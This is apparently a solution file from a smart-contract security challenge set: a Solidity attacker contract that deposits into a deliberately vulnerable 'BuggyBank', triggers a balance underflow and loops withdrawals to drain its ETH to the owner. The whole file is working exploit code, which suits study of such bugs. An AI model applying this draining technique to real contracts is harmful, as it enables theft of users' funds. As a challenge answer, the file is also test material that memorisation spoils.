// File: challenges/05-arithmetic/exploit/Attacker.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "../contracts/Vulnerable.sol";

/// @notice Repeatedly withdraw to exploit underflowed balance.
contract ArithmeticAttacker {
    BuggyBank public bank;
    address public owner;

    constructor(BuggyBank _bank) {
        bank = _bank;
        owner = msg.sender;
    }

    /// @param initialDeposit ETH amount to seed the bank (must be provided with msg.value)
    /// @param singleWithdraw chunk size for repeated withdrawals
    /// @param maxIterations safety cap for loop
    function attack(uint256 initialDeposit, uint256 singleWithdraw, uint256 maxIterations) external payable {
        require(msg.sender == owner, "not owner");
        require(msg.value >= initialDeposit, "need ETH for deposit");

        // Seed the bank so the first require passes.
        bank.deposit{value: initialDeposit}();

        // First withdraw equal to our deposit triggers underflow because fee > 0.
        bank.withdraw(singleWithdraw);

        // After underflow, our recorded balance is ~2^256 - fee; loop withdrawals.
        for (uint256 i = 0; i < maxIterations; i++) {
            if (address(bank).balance == 0) break;
            uint256 chunk = address(bank).balance > singleWithdraw ? singleWithdraw : address(bank).balance;
            if (chunk == 0) break;
            bank.withdraw(chunk);
        }

        // Forward any ETH sitting on this contract to the owner EOA.
        (bool ok, ) = payable(owner).call{value: address(this).balance}("");
        require(ok, "payout fail");
    }

    receive() external payable {}
}
